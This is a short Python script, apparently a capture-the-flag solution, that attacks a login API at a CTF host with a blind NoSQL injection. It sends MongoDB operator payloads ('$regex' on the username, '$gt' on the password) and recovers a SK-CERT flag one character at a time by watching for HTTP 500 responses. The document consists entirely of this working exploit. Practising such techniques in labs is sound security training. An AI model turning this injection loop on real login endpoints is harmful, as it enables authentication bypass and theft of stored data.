import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# Both gave 500! Wait, maybe there's a user whose username IS the flag!
# Let's extract the exact username that starts with SK-CERT{

import string
flag = "SK-CERT{"
charset = string.ascii_letters + string.digits + "_-!?@#$%^&*()=+}[]"

for i in range(50):
    found = False
    for c in charset:
        test_flag = flag + c
        # Escape regex characters just in case
        safe_flag = test_flag.replace('+', '\\+').replace('*', '\\*').replace('.', '\\.').replace('?', '\\?').replace('(', '\\(').replace(')', '\\)').replace('[', '\\[').replace(']', '\\]').replace('$', '\\$').replace('^', '\\^')
        payload = {"username": {"$regex": "^" + safe_flag + ".*"}, "password": {"$gt": ""}}
        r = requests.post(url, json=payload, headers=headers)
        if r.status_code == 500:
            flag += c
            print(f"Found so far: {flag}")
            found = True
            break
    if not found:
        print("Done!")
        break

print(f"Final flag: {flag}")
